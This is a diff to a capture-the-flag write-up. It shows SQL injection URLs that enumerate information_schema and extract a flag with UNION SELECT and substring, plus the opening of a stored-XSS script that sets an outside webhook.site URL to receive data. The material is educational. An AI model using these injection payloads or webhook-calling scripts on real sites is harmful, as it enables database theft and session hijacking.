@@ -44,7 +44,7 @@ web.kazet.cc:31339/stats/1 OR 1=0 UNION ALL SELECT table_name, NULL FROM informa
 ```
 We use the `UNION ALL` operator for no rows to get lost. The output shows a table with the name `interesting_and_secret_information`. The name suggests it is what we're looking for. Let's query its columns:
 ```pgsql
-web.kazet.cc:31339/stats/1 OR 1=0 UNION SELECT column_name, DATA_TYPE FROM information_schema.columns WHERE table_name='interesting_and_secret_information'--
+web.kazet.cc:31339/stats/1 OR 1=0 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='interesting_and_secret_information'--
 ```
 This outputs a column with the name `secret_text_for_example_a_flag`. Let's view its type:
 ```pgsql
@@ -60,7 +60,7 @@ It outputs:
 FLAG{this_is_a_long_and_interesting_flag_9393265140f32ff7...
 ```
 So we're almost there. Let's query for a substring of that result:
-```psql
+```pgsql
 http://web.kazet.cc:31339/stats/1 OR 1=0 UNION ALL SELECT substring(secret_text_for_example_a_flag, 18), NULL FROM interesting_and_secret_information --
 ```
 And so we get the entire flag:
@@ -88,7 +88,7 @@ curl 'http://web.kazet.cc:31339/send_article' \
 ```
 where `<CONTENTS>` is whatever whe enter in the field, naturally it has to be [url-encoded](https://www.urlencoder.org/).
 
-By viewing the input box's HTML it's evident that one can input any valid HTML, there's also no need for the enclosing `<p>` tags. So why not try some simple JS?
+By viewing the input box's HTML it's evident that one can input any valid HTML, there's also no need for the enclosing `<p>` tags. So why not try some simple JS that pings a webhook of ours?
 ```html
 <script>
    const webhook = 'https://webhook.site/82310b30-bdb3-45f9-8d46-92f9c44fcf0d';
